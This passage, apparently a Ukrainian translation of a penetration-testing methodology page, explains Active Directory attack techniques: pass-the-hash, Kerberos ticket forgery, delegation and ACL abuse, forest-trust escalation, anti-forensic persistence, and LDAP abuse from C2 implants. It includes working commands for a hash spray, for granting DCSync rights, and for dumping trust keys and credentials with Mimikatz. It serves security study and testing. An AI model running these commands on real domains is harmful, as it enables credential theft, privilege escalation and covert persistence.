Маючи доменні облікові дані або користувацький сеанс, повторно перевірте NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): автентифіковане перерахування та техніки примусового запуску автентифікації можуть виявити шляхи relay, недоступні під час розвідки без автентифікації.

### Пошук облікових даних у спільних ресурсах комп’ютерів | SMB Shares

Тепер, коли у вас є базові облікові дані, варто перевірити, чи вдасться **знайти** якісь **цікаві файли, до яких відкрито спільний доступ в AD**. Це можна зробити вручну, але завдання дуже нудне й одноманітне (особливо якщо знайдете сотні документів, які потрібно перевірити).

[**Перейдіть за цим посиланням, щоб дізнатися про інструменти, які можна використати.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Викрадення облікових даних NTLM

Якщо ви можете **отримати доступ до інших ПК або спільних ресурсів**, то можете **розмістити файли** (наприклад, файл SCF), які в разі відкриття **спричинять автентифікацію NTLM до вас**, щоб ви могли **викрасти** **виклик NTLM** і зламати його:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість давала будь-якому автентифікованому користувачу змогу **скомпрометувати контролер домену**.


{{#ref}}
printnightmare.md
{{#endref}}

## Підвищення привілеїв в Active Directory З привілейованими обліковими даними/сеансом

**Для наведених нижче технік звичайних доменних облікових даних недостатньо: для виконання цих атак потрібні спеціальні привілеї/облікові дані.**

### Вилучення хешів

Сподіваємося, вам вдалося **скомпрометувати обліковий запис локального адміністратора** за допомогою [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), зокрема через relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [локального підвищення привілеїв](../windows-local-privilege-escalation/index.html).\
Тепер час вилучити всі хеші з пам’яті та локально.\
[**Прочитайте цю сторінку про різні способи отримання хешів.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Отримавши хеш користувача**, ви можете використати його, щоб **видати себе за цього користувача**.\
Потрібно скористатися **інструментом**, який **виконає** **автентифікацію NTLM за допомогою** цього **хешу**, **або** створити новий **sessionlogon** і **впровадити** цей **хеш** у **LSASS**, щоб під час будь-якої **автентифікації NTLM використовувався цей хеш**. Саме так працює mimikatz у другому випадку.\
[**Докладніше читайте на цій сторінці.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Мета цієї атаки — **використати хеш NTLM користувача для запиту квитків Kerberos** як альтернативу звичайному Pass The Hash через протокол NTLM. Тому вона може бути особливо **корисною в мережах, де протокол NTLM вимкнено**, а для автентифікації дозволено лише **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Під час атаки **Pass The Ticket (PTT)** зловмисники **викрадають квиток автентифікації користувача**, а не його пароль чи хеш. Потім цей викрадений квиток використовують, щоб **видати себе за користувача** й отримати несанкціонований доступ до ресурсів і служб у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Повторне використання облікових даних

Якщо у вас є **хеш** або **пароль** **локального адміністратора**, спробуйте **увійти локально** на інші **ПК** за їх допомогою.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Зверніть увагу: це досить **шумна** активність, і **LAPS** допоможе її **нейтралізувати**.

### Зловживання MSSQL і довірені зв’язки

Якщо користувач має привілеї для **доступу до екземплярів MSSQL**, він може використовувати їх для **виконання команд** на хості MSSQL (якщо служба працює від імені SA), **викрасти** NetNTLM **хеш** або навіть виконати **relay-атаку**.\
Якщо екземпляр MSSQL довірений іншому екземпляру через посилання на базу даних, користувач із привілеями до пов’язаної бази може **скористатися довірчими відносинами, щоб виконувати запити на іншому екземплярі**. Ці зв’язки можна об’єднувати в ланцюжки, які зрештою можуть привести до неправильно налаштованої бази даних, де користувач зможе виконувати команди.\
**Зв’язки між базами даних працюють навіть через довірчі відносини між лісами.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Зловживання платформами керування ІТ-активами та розгортання

Сторонні комплекси для інвентаризації та розгортання часто надають потужні можливості для доступу до облікових даних і виконання коду. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете об’єкт Computer з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте доменні привілеї на цьому комп’ютері, ви зможете витягнути TGT з пам’яті для кожного користувача, який увійде на комп’ютер.\
Отже, якщо **Domain Admin увійде на комп’ютер**, ви зможете витягнути його TGT і видати себе за нього за допомогою [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation можна навіть **автоматично скомпрометувати сервер друку** (сподіваємося, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувачеві або комп’ютеру дозволено "Constrained Delegation", він зможе **видавати себе за будь-якого користувача для доступу до певних служб на комп’ютері**.\
Тоді, якщо ви **скомпрометуєте хеш** цього користувача/комп’ютера, то зможете **видавати себе за будь-якого користувача** (навіть за domain admin) для доступу до певних служб.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Наявність привілею **WRITE** для об’єкта Active Directory віддаленого комп’ютера дає змогу отримати виконання коду з **підвищеними привілеями**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Зловживання дозволами/ACL

Скомпрометований користувач може мати **цікаві привілеї щодо певних об’єктів домену**, які дадуть змогу **переміщатися** мережею латерально або **підвищувати** привілеї.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Зловживання службою Printer Spooler

Виявлену в домені **службу Spool, що прослуховує з’єднання**, можна **використати**, щоб **отримати нові облікові дані** та **підвищити привілеї**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Зловживання сеансами сторонніх користувачів

Якщо **інші користувачі** **отримують доступ** до **скомпрометованого** комп’ютера, можна **зібрати облікові дані з пам’яті** й навіть **впровадити beacon-и в їхні процеси**, щоб видавати себе за них.\
Зазвичай користувачі отримують доступ до системи через RDP, тож нижче описано, як виконати кілька атак на сторонні RDP-сеанси:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** забезпечує керування **паролем локального Administrator** на комп’ютерах, приєднаних до домену, гарантуючи, що пароль **рандомізований**, унікальний і часто **змінюється**. Ці паролі зберігаються в Active Directory, а доступ до них обмежений за допомогою ACL і надається лише авторизованим користувачам. Якщо у вас достатньо привілеїв для доступу до цих паролів, можна перейти на інші комп’ютери.


{{#ref}}
laps.md
{{#endref}}

### Викрадення сертифікатів

**Збір сертифікатів** зі скомпрометованого комп’ютера може стати способом підвищити привілеї в середовищі:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Зловживання шаблонами сертифікатів

Якщо налаштовано **вразливі шаблони**, можна скористатися ними для підвищення привілеїв:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Постексплуатація з обліковим записом із високими привілеями

### Витягування облікових даних домену

Отримавши привілеї **Domain Admin** або, ще краще, **Enterprise Admin**, ви можете **витягнути** **базу даних домену**: _ntds.dit_.

[**Детальнішу інформацію про атаку DCSync можна знайти тут**](dcsync.md).

[**Детальнішу інформацію про викрадення NTDS.dit можна знайти тут**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Читабельний резервний архів із `ntds.dit` і вуликом `SYSTEM` слід вважати матеріалом каталогу, до якого отримано доступ, навіть до його розпакування. Застарілий хеш пароля не означає, що інші атрибути об’єктів є безпечними: такі поля, як `description`, можуть містити облікові дані або робочі нотатки. Спершу перевірте назви файлів в архіві й не включайте вміст розпакованої бази даних до звичайних результатів переліку.

### Підвищення привілеїв як механізм закріплення

Деякі з розглянутих вище технік можна використовувати для закріплення.\
Наприклад, можна:

- Зробити користувачів вразливими до [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Зробіть користувачів вразливими до [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Надати користувачу привілеї [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** створює **легітимний квиток Ticket Granting Service (TGS)** для певної служби за допомогою **NTLM-хешу** (наприклад, **хешу облікового запису комп’ютера**). Цей метод використовують, щоб **отримати доступ до привілеїв служби**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** передбачає, що зловмисник отримує доступ до **NTLM-хешу облікового запису krbtgt** у середовищі Active Directory (AD). Цей обліковий запис особливий, оскільки використовується для підписування всіх **квитків Ticket Granting Ticket (TGT)**, необхідних для автентифікації в мережі AD.

Отримавши цей хеш, зловмисник може створювати **TGT** для будь-якого обраного ним облікового запису (Silver Ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це квитки, подібні до golden ticket, але підроблені так, щоб **обходити поширені механізми виявлення golden ticket**.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Закріплення за допомогою сертифікатів облікового запису**

**Наявність сертифікатів облікового запису або можливість їх запитувати** — чудовий спосіб зберегти закріплення в обліковому записі користувача (навіть якщо він змінить пароль):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Закріплення в домені за допомогою сертифікатів**

**За допомогою сертифікатів також можна зберегти закріплення з високими привілеями в домені:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Група AdminSDHolder

Об’єкт **AdminSDHolder** в Active Directory захищає **привілейовані групи** (як-от Domain Admins і Enterprise Admins), застосовуючи до них стандартний **список керування доступом (ACL)**, щоб запобігти несанкціонованим змінам. Однак цю функцію можна використати: якщо зловмисник змінить ACL AdminSDHolder, надавши звичайному користувачеві повний доступ, той отримає широкі можливості керування всіма привілейованими групами. Тож цей механізм захисту може мати зворотний ефект і надати небажаний доступ, якщо за ним ретельно не стежити.

[**Докладніше про групу AdminDSHolder — тут.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Облікові дані DSRM

На кожному **контролері домену (DC)** є обліковий запис **локального адміністратора**. Отримавши права адміністратора на такому комп’ютері, можна витягти хеш локального адміністратора за допомогою **mimikatz**. Після цього потрібно змінити реєстр, щоб **увімкнути використання цього пароля** й отримати віддалений доступ до облікового запису локального адміністратора.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Закріплення через ACL

Можна **надати** **спеціальні дозволи** **користувачеві** для певних об’єктів домену, щоб у майбутньому він міг **підвищити привілеї**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Дескриптори безпеки

**Дескриптори безпеки** використовуються для **зберігання** **дозволів**, які **об’єкт** має **щодо** іншого **об’єкта**. Навіть **незначна зміна** **дескриптора безпеки** об’єкта може надати вам дуже цікаві привілеї щодо цього об’єкта без потреби входити до привілейованої групи.


{{#ref}}
security-descriptors.md
{{#endref}}

### Динамічні об’єкти: протидія криміналістиці / ухилення від виявлення

Зловживайте допоміжним класом `dynamicObject`, щоб створювати короткоживучі облікові записи, GPO та записи DNS за допомогою `entryTTL`/`msDS-Entry-Time-To-Die`. Вони видаляються самостійно без tombstone-записів, стираючи докази LDAP, але залишаючи осиротілі SID, некоректні посилання `gPLink` або кешовані відповіді DNS (наприклад, забруднення ACE в AdminSDHolder або зловмисні перенаправлення `gPCFileSysPath`/інтегрованого з AD DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Змініть **LSASS** у пам’яті, щоб установити **універсальний пароль** і отримати доступ до всіх облікових записів домену.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Дізнайтеся тут, що таке SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Можна створити **власний SSP**, щоб **перехоплювати** **облікові дані** у **відкритому тексті**, які використовуються для доступу до комп’ютера.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Він реєструє в AD **новий контролер домену** та використовує його для **надсилання атрибутів** (SIDHistory, SPN тощо) зазначеним об’єктам, не залишаючи **жодних журналів** про **зміни**. Вам потрібні привілеї **DA** і доступ до **кореневого домену**.\
Зверніть увагу: якщо використати неправильні дані, у журналах з’являться досить непривабливі записи.


{{#ref}}
dcshadow.md
{{#endref}}

### Закріплення через LAPS

Раніше ми обговорювали підвищення привілеїв за наявності **достатніх дозволів для читання паролів LAPS**. Однак ці паролі також можна використовувати для **збереження закріплення**.\
Дивіться:


{{#ref}}
laps.md
{{#endref}}

## Підвищення привілеїв у лісі — довірчі відносини доменів

Microsoft вважає **ліс** межею безпеки. Це означає, що **компрометація одного домену потенційно може призвести до компрометації всього лісу**.<sup>[[1]](#references)</sup>

### Основна інформація

[**Довірчі відносини доменів**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це механізм безпеки, який дає користувачеві з одного **домену** змогу отримувати доступ до ресурсів іншого **домену**. По суті, він створює зв’язок між системами автентифікації двох доменів, забезпечуючи безперешкодний обмін даними для перевірки автентифікації. Коли домени встановлюють довірчі відносини, вони обмінюються певними **ключами** та зберігають їх на своїх **контролерах домену (DC)**. Ці ключі мають вирішальне значення для цілісності довірчих відносин.

У типовому сценарії, якщо користувач хоче отримати доступ до служби в **довіреному домені**, спершу він має запитати спеціальний квиток — **міждоменний TGT** — у контролера домену власного домену. Цей TGT шифрується спільним **ключем**, погодженим між обома доменами. Потім користувач передає цей TGT **контролеру домену довіреного домену**, щоб отримати квиток служби (**TGS**). Після успішної перевірки міждоменного TGT контролер домену довіреного домену видає TGS, надаючи користувачеві доступ до служби.

**Кроки**:

1. **Клієнтський комп’ютер** у **домені 1** розпочинає процес, використовуючи свій **NTLM-хеш** для запиту **квитка Ticket Granting Ticket (TGT)** у свого **контролера домену (DC1)**.
2. Якщо автентифікація клієнта пройшла успішно, DC1 видає новий TGT.
3. Потім клієнт запитує в DC1 **міждоменний TGT**, необхідний для доступу до ресурсів у **домені 2**.
4. Міждоменний TGT шифрується **ключем довіри**, спільним для DC1 і DC2 у межах двосторонніх довірчих відносин доменів.
5. Клієнт передає міждоменний TGT **контролеру домену 2 (DC2)**.
6. DC2 перевіряє міждоменний TGT за допомогою спільного ключа довіри і, якщо він дійсний, видає **квиток Ticket Granting Service (TGS)** для сервера в домені 2, до якого клієнт хоче отримати доступ.
7. Нарешті клієнт передає цей TGS серверу. Квиток зашифрований хешем облікового запису сервера й надає доступ до служби в домені 2.

### Типи довірчих відносин

Важливо пам’ятати, що **довірчі відносини можуть бути односторонніми або двосторонніми**. У разі двосторонніх відносин домени довіряють один одному. За **односторонніх** відносин один домен буде **довіреним**, а інший — **доменом, що довіряє**. У цьому разі **ресурси домену, що довіряє, доступні лише з довіреного домену**.

Якщо домен A довіряє домену B, A є доменом, що довіряє, а B — довіреним доменом. Крім того, у **домені A** це буде **вихідна довіра**, а в **домені B** — **вхідна довіра**.

**Різні типи довірчих відносин**

- **Довірчі відносини «батьківський — дочірній домен»**: поширена конфігурація в межах одного лісу, за якої дочірній домен автоматично має двосторонні транзитивні довірчі відносини зі своїм батьківським доменом. Це означає, що запити на автентифікацію можуть безперешкодно передаватися між батьківським і дочірнім доменами.
- **Перехресні довірчі відносини**: їх також називають «довірчими відносинами швидкого доступу». Їх налаштовують між дочірніми доменами, щоб пришвидшити процес переспрямування запитів. У складних лісах запити автентифікації зазвичай мають пройти вгору до кореня лісу, а потім униз до цільового домену. Перехресні зв’язки скорочують цей шлях, що особливо корисно в географічно розподілених середовищах.
- **Зовнішні довірчі відносини**: їх встановлюють між різними, не пов’язаними між собою доменами; вони за своєю природою нетранзитивні. Згідно з [документацією Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), зовнішні довірчі відносини корисні для доступу до ресурсів домену за межами поточного лісу, який не з’єднаний із ним довірчими відносинами між лісами. Безпеку посилює фільтрація SID для зовнішніх довірчих відносин.
- **Довірчі відносини між коренями дерев**: вони автоматично встановлюються між кореневим доменом лісу та новим коренем дерева. Хоча такі відносини трапляються нечасто, вони важливі для додавання нових дерев доменів до лісу, даючи їм змогу зберігати унікальне ім’я домену та забезпечуючи двосторонню транзитивність. Докладніше дивіться в [посібнику Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Довірчі відносини між лісами**: це двосторонні транзитивні довірчі відносини між кореневими доменами двох лісів. Для посилення безпеки вони також використовують фільтрацію SID.
- **Довірчі відносини MIT**: їх встановлюють із доменами Kerberos, що не належать до Windows і відповідають стандарту [RFC4120](https://tools.ietf.org/html/rfc4120). Такі відносини мають спеціалізоване призначення та підходять для середовищ, яким потрібна інтеграція із системами на основі Kerberos поза екосистемою Windows.

#### Інші особливості **довірчих відносин**

- Довірчі відносини також можуть бути **транзитивними** (A довіряє B, B довіряє C, отже A довіряє C) або **нетранзитивними**.
- Довірчі відносини можуть бути **двосторонніми** (домени довіряють один одному) або **односторонніми** (один домен довіряє іншому).

### Шлях атаки

1. **Перерахуйте** довірчі відносини.
2. Перевірте, чи має якийсь **суб’єкт безпеки** (користувач/група/комп’ютер) **доступ** до ресурсів **іншого домену** — можливо, завдяки записам ACE або членству в групах іншого домену. Шукайте **зв’язки між доменами** (імовірно, саме для цього й було створено довірчі відносини).
   1. У цьому випадку також можна спробувати kerberoast.
3. **Скомпрометуйте** **облікові записи**, за допомогою яких можна **переміщатися між доменами**.

Зловмисники можуть отримати доступ до ресурсів іншого домену трьома основними способами:

- **Членство в локальних групах**: суб’єктів можуть додати до локальних груп на комп’ютерах, наприклад до групи «Адміністратори» на сервері, надавши їм значний контроль над цим комп’ютером.
- **Членство в групах зовнішнього домену**: суб’єкти також можуть входити до груп у зовнішньому домені. Однак ефективність цього способу залежить від типу довірчих відносин і сфери дії групи.
- **Списки керування доступом (ACL)**: суб’єктів можна вказати в **ACL**, зокрема як об’єкти в **ACE** у складі **DACL**, надавши їм доступ до певних ресурсів. Щоб докладніше ознайомитися з принципами роботи ACL, DACL і ACE, дивіться цінний документ “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.<sup>[[17]](#references)</sup>

### Пошук зовнішніх користувачів/груп із дозволами

Перевірте **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти зовнішніх суб’єктів безпеки в домені. Це будуть користувачі/групи із **зовнішнього домену/лісу**.

Це можна перевірити в **Bloodhound** або за допомогою powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Ескалація привілеїв у лісі від дочірнього до батьківського домену

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Інші способи виявити довірчі відносини між доменами:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Є **2 довірені ключі**: один для _Child --> Parent_, а інший — для _Parent_ --> _Child_.\
> Ви можете той, який використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Підвищте привілеї до Enterprise admin у дочірньому/батьківському домені, зловживаючи довірою за допомогою SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writable Configuration NC

Важливо розуміти, як можна експлуатувати Configuration Naming Context (NC). Configuration NC слугує централізованим сховищем даних конфігурації в лісах середовищ Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у лісі, причому DC із правом запису підтримують копію Configuration NC, доступну для запису. Для цієї експлуатації потрібні **привілеї SYSTEM на DC**, бажано на дочірньому DC.

**Зв’язування GPO із сайтом кореневого DC**

Контейнер Sites у Configuration NC містить відомості про сайти всіх комп’ютерів, приєднаних до домену в лісі AD. Маючи привілеї SYSTEM на будь-якому DC, зловмисники можуть зв’язувати GPO із сайтами кореневого DC. Це може призвести до компрометації кореневого домену через зміну політик, застосованих до цих сайтів.

Докладніше про це можна дізнатися з дослідження [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Компрометація будь-якого gMSA у лісі**

Один із векторів атаки — націлювання на привілейовані gMSA у домені. Кореневий ключ KDS, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи привілеї SYSTEM на будь-якому DC, можна отримати доступ до кореневого ключа KDS і обчислити паролі будь-якого gMSA у лісі.

Докладний аналіз і покрокові інструкції наведено тут:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Додаткова атака на делегований MSA (BadSuccessor – зловживання атрибутами міграції):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткове зовнішнє дослідження: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Атака зі зміною схеми**

Цей метод потребує терпіння: потрібно дочекатися створення нових привілейованих об’єктів AD. Маючи привілеї SYSTEM, зловмисник може змінити схему AD, щоб надати будь-якому користувачеві повний контроль над усіма класами. Це може призвести до несанкціонованого доступу до новостворених об’єктів AD і контролю над ними.

Докладніше читайте в матеріалі [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Від DA до EA за допомогою ADCS ESC5**

Вразливість ADCS ESC5 дає змогу отримати контроль над об’єктами Public Key Infrastructure (PKI) і створити шаблон сертифіката, який дозволяє автентифікуватися як будь-який користувач у лісі. Оскільки об’єкти PKI розміщені в Configuration NC, компрометація дочірнього DC із правом запису дає змогу виконувати атаки ESC5.

Докладніше про це можна прочитати в матеріалі [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Якщо ADCS відсутній, зловмисник може налаштувати необхідні компоненти, як описано в матеріалі [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Зовнішній домен лісу — одностороння (вхідна) або двостороння довіра

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

У цьому сценарії **ваш домен є довіреним** для зовнішнього домену, який надає вам **невизначені дозволи** в ньому. Вам потрібно з’ясувати, **які суб’єкти вашого домену мають доступ до зовнішнього домену і який саме**, а потім спробувати скористатися цим:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній домен лісу — одностороннє (вихідне з’єднання)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

У цьому сценарії **ваш домен** **надає** певні **привілеї** principal з **інших доменів**.

Однак, коли **домен довіряє іншому домену**, довірений домен **створює користувача** з **передбачуваним ім’ям**, використовуючи як **пароль пароль довіри**. Це означає, що можна **отримати доступ до користувача з домену, що довіряє**, щоб проникнути до довіреного домену, провести його розвідку та спробувати підвищити привілеї:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Інший спосіб скомпрометувати довірений домен — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений у **протилежному напрямку** від довірчих відносин між доменами (що трапляється нечасто).

Ще один спосіб скомпрометувати довірений домен — дочекатися на машині, до якої **може отримати доступ користувач із довіреного домену**, щоб він увійшов через **RDP**. Тоді зловмисник зможе впровадити код у процес сеансу RDP і **отримати доступ до вихідного домену жертви**.\
Крім того, якщо **жертва підключила свій жорсткий диск**, з процесу **сеансу RDP** зловмисник може зберегти **бекдори** в **папці автозапуску жорсткого диска**. Ця техніка називається **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Заходи протидії зловживанню довірчими відносинами доменів

### **Фільтрація SID:**

- Ризик атак із використанням атрибута SID history через довірчі відносини між лісами зменшується завдяки фільтрації SID, яка за замовчуванням активована для всіх таких довірчих відносин. Це ґрунтується на припущенні, що довірчі відносини всередині лісу є безпечними, адже, відповідно до позиції Microsoft, межею безпеки є ліс, а не домен.
- Однак є нюанс: фільтрація SID може порушити роботу застосунків і доступ користувачів, тому її іноді вимикають.

### **Вибіркова автентифікація:**

- Для довірчих відносин між лісами використання вибіркової автентифікації гарантує, що користувачі з двох лісів не проходять автентифікацію автоматично. Натомість для доступу користувачів до доменів і серверів у домені або лісі, що довіряє, потрібні явні дозволи.
- Важливо зазначити, що ці заходи не захищають від експлуатації доступного для запису Configuration Naming Context (NC) або атак на обліковий запис довіри.

[**Докладніше про довірчі відносини доменів на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Зловживання AD на основі LDAP із хостових імплантів

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) повторно реалізує LDAP-примітиви в стилі bloodyAD як x64 Beacon Object Files, що працюють повністю всередині хостового імпланта (наприклад, Adaptix C2). Оператори збирають пакунок командою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` із beacon. Увесь трафік використовує поточний контекст безпеки входу через LDAP (389) із підписуванням/шифруванням або через LDAPS (636) з автоматичною довірою до сертифіката, тому socks-проксі та артефакти на диску не потрібні.<sup>[[4]](#references)</sup>

### Перерахування LDAP на стороні імпланта

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` і `get-groupmembers` перетворюють короткі імена/шляхи OU на повні DN і вивантажують відповідні об’єкти.
- `get-object`, `get-attribute` і `get-domaininfo` отримують довільні атрибути (зокрема дескриптори безпеки), а також метадані лісу/домену з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` і `get-rbcd` безпосередньо з LDAP надають списки цілей для roasting, налаштування делегування та наявні дескриптори [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` і `get-writable --detailed` аналізують DACL, щоб перелічити довірених суб’єктів, права (GenericAll/WriteDACL/WriteOwner/запис атрибутів) і успадкування, одразу визначаючи цілі для підвищення привілеїв через ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Примітиви запису LDAP для підвищення привілеїв і закріплення

- BOF-и для створення об’єктів (`add-user`, `add-computer`, `add-group`, `add-ou`) дають оператору змогу створювати нові principals або облікові записи комп’ютерів у будь-яких OU, де є відповідні права. `add-groupmember`, `set-password`, `add-attribute` і `set-attribute` дають змогу безпосередньо захоплювати цілі, коли виявлено права на запис властивостей.
- Команди для роботи з ACL, як-от `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` і `add-dcsync`, перетворюють WriteDACL/WriteOwner для будь-якого об’єкта AD на скидання паролів, контроль членства в групах або привілеї реплікації DCSync, не залишаючи артефактів PowerShell/ADSI. Команди `remove-*` прибирають додані ACE.

### Делегування, roasting і зловживання Kerberos

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача вразливим до Kerberoast; `add-asreproastable` (перемикач UAC) позначає його як вразливого до AS-REP roasting без зміни пароля.
- Макроси делегування (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) змінюють `msDS-AllowedToDelegateTo`, прапорці UAC або `msDS-AllowedToActOnBehalfOfOtherIdentity` безпосередньо з beacon, уможливлюючи шляхи атак із constrained/unconstrained/RBCD і усуваючи потребу у віддаленому PowerShell або RSAT.

### Ін’єкція sidHistory, переміщення OU та формування поверхні атаки

- `add-sidhistory` додає привілейовані SID до історії SID контрольованого principal (див. [Ін’єкція SID-History](sid-history-injection.md)), забезпечуючи приховане успадкування доступу повністю через LDAP/LDAPS.
